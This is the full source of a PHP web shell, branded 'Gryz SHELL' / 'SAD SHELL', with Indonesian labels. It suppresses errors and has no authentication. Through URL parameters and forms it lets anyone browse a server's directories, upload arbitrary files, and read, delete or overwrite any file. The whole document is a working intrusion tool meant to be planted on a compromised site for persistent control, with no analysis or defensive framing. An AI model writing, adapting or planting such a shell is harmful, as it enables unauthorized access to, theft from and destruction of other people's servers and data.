
<?php error_reporting(0); ?>
<!DOCTYPE html>
<html>
<head>
	<title>-= Gryz SHELL =-</title>
	<link href="https://fonts.googleapis.com/css2?family=Courgette&family=Cuprum:ital@1&family=Rowdies&display=swap" rel="stylesheet"> 
</head>
<style>
	* {
		font-family: cursive;
		color: black;
		font-family: 'Cuprum', sans-serif;

	}

	body {
		background-image: url("https://i.ibb.co/McTp7jw/2d115ae688938c3ea91ebeb819f1b9fd.jpg");
    	background-size:cover;
		background-attachment: fixed;
	}

	body h1{
		color: #A52A2A;
		text-shadow: 2px 2px 2px #000;
		font-size: 50px;
	}
	.dir {
		text-align: center;
		font-size: 30px;
	}
	.dir a{
		text-decoration: none;
		color: #48D1CC;
		text-shadow: 1px 1px 1px #000;

	}
	.dir a:hover{
		text-decoration: none;
		color: red;
	}
	table {
		margin: 12px auto;
		height: 100%;
		border-collapse: collapse;
		font-size: 30px;
	}
	table,th {
		border-top:1px solid #000;
		border-right:3px solid #000;
		border-bottom: 3px solid #000;
		border-left:1px solid #000;
		box-sizing: border-box;
		padding: 2px 2px;
		color: #F0E68C;
		text-shadow: 1px 1px 1px #000;
	}
	table,td {
		border-top:1px solid #000;
		border-right:3px solid #000;
		border-bottom: .5px solid #000;
		border-left:1px solid #000;
		box-sizing: border-box;
		padding: 8px 8px;
		color: red;
	}
	table,td a {
		text-decoration: none;
		color:#8A2BE2;
		text-shadow: 1px 1px 1px #000;
	}
	table,td a:hover {
		text-decoration: none;
		color: red;
	}
	.button1 {
		width: 70px;
		height: 30px;
		background-color: #999;
		margin: 10px 3px;
		padding: 5px;
		color: #000;
		border-radius: 5px;
		border: 1px solid #000;
		box-shadow: .5px .5px .3px .3px #fff;
		box-sizing: border-box;
	}
	.button1 a{
		width: 70px;
		height: 30px;
		background-color: #999;
		margin: 10px 3px;
		padding: 5px;
		color: red;
		border-radius: 5px;
		border: 1px solid #000;
		box-shadow: .5px .5px .3px .3px #fff;
		box-sizing: border-box;
	}
	.button1:hover {
		text-shadow: 0px 0px 5px #fff;
		box-shadow: .5px .5px .3px .3px #555;
		text-decoration: none;
	}
	textarea {
		border: 1px solid green;
		border-radius: 5px;
		box-shadow: 1px 1px 1px 1px #fff;
		width: 100%;
		height: 400px;
		padding-left: 10px;
		margin: 10px auto;
		resize: none;
		background: green;
		color: #ffffff;
		font-family: 'Cuprum', sans-serif;
		font-size: 13px;
	}
</style>
<body>
	<center><h1>-= SAD SHELL =-</h1></center>
  <div class="dir">
	<?php  
	if (isset($_GET['dir'])) {
			$dir = $_GET['dir'];
		} else {
			$dir = getcwd();
		}

		$dir = str_replace("\\", "/", $dir);
		$dirs = explode("/", $dir);

		foreach ($dirs as $key => $value) {
			if ($value == "" && $key == 0){
				echo '<a href="/">/</a>'; continue;
			} echo '<a href="?dir=';

			for ($i=0; $i <= $key ; $i++) { 
				echo "$dirs[$i]"; if ($key !== $i) echo "/";
			} echo '">'.$value.'</a>/';
	}
	if (isset($_POST['submit'])){

		$namafile = $_FILES['upload']['name'];
		$tempatfile = $_FILES['upload']['tmp_name'];
		$tempat = $_GET['dir'];
		$error = $_FILES['upload']['error'];
		$ukuranfile = $_FILES['upload']['size'];

		move_uploaded_file($tempatfile, $dir.'/'.$namafile);
				echo "
					<script>alert('Succes !!!');</script>
					";
						

	
	}
	?>

	<form method="post" enctype="multipart/form-data">
		<input type="file" name="upload">
		<input type="submit" name="submit" value="Upload">
		
	</form>

  </div>
<table>
	<tr>
		<th>Nama File / Folder</th>
		<th>Size</th>
		<th>Action</th>
	</tr>
	<?php
	$scan = scandir($dir);

foreach ($scan as $directory) {
	if (!is_dir($dir.'/'.$directory) || $directory == '.' || $directory == '..') continue;

	echo '
	<tr>
	<td><a href="?dir='.$dir.'/'.$directory.'">'.$directory.'</a></td>
	<td>--</td>
	<td>NONE</td>
	</tr>
	';
	} 
foreach ($scan as $file) {
	if (!is_file($dir.'/'.$file)) continue;

	$jumlah = filesize($dir.'/'.$file)/1024;
	$jumlah = round($jumlah, 3);
	if ($jumlah >= 1024) {
		$jumlah = round($jumlah/1024, 2).'MB';
	} else {
		$jumlah = $jumlah .'KB';
	}

	echo '
	<tr>
	<td><a href="?dir='.$dir.'&open='.$dir.'/'.$file.'">'.$file.'</a></td>
	<td>'.$jumlah.'</td>
	<td><a href="?dir='.$dir.'&delete='.$dir.'/'.$file.'" class="button1">Delete</a>
	<a href="?dir='.$dir.'&ubah='.$dir.'/'.$file.'" class="button1">Edit</a>
	</td>
	</tr>
	';
}
if (isset($_GET['open'])) {
	echo '
	<br />
	<style>
		table {
			display: none;
		}
	</style>
	<textarea>'.htmlspecialchars(file_get_contents($_GET['open'])).'</textarea>
	';
}

if (isset($_GET['delete'])) {
	if (unlink($_GET['delete'])) {
		echo "<script>alert('dihapus');window.location='?dir=".$dir."';</script>";
	}
}
if (isset($_GET['ubah'])) {
	echo '

		<style>
			table {
				display: none;
			}
		</style>

		<a href="?dir='.$dir.'" class="button1"><=Back</a>
		<form method="post" action="">
		<input type="hidden" name="object" value="'.$_GET['ubah'].'">
		<textarea name="edit">'.htmlspecialchars(file_get_contents($_GET['ubah'])).'</textarea>
		<center><button type="submit" name="go" value="Submit" class="button1">Liking</button></center>
		</form>

		';
}
if (isset($_POST['edit'])) {
	$data = fopen($_POST["object"], 'w');
	if (fwrite($data, $_POST['edit'])) {

		echo 
			'
			<script>alert("Succes Edit!!!");window.location="?dir='.$dir.'";</script>						
			';

	} else {
		echo "
			<script>alert('failed');</script>					
			";
	}
}
?>
</table>
</body>
</html>